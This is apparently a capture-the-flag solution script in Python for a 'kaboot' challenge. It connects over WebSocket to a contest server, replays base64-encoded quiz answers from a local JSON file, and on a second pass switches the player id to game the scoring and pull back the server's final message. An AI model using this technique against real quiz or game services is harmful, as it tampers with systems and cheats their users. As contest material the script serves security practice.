import json
import time
from base64 import b64decode, b64encode

import websocket

kahoot = json.load(open("kahoot.json"))
URL = "https://kaboot-2eb00f0771371d6b.tjc.tf"
WS_URL = URL.replace("http", "ws")

room = "aaaa"

ws = websocket.WebSocket()
ws.connect(WS_URL + "/room/" + room)
ws.recv()

for kahoot_data in kahoot["questions"]:
    ws.recv()
    ws.send(
        b64encode(
            json.dumps(
                {
                    "send_time": time.time(),
                    "answer": kahoot_data["answer"],
                    "id": "urmom",
                }
            ).encode()
        )
    )
ws.close()

ws = websocket.WebSocket()
ws.connect(WS_URL + "/room/" + room)
ws.recv()

for i, kahoot_data in enumerate(kahoot["questions"]):
    ws.recv()
    ws.send(
        b64encode(
            json.dumps(
                {
                    "send_time": time.time(),
                    "answer": kahoot_data["answer"],
                    "id": "urmom" if i > 1 else "a",
                }
            ).encode()
        )
    )
print(b64decode(ws.recv()))
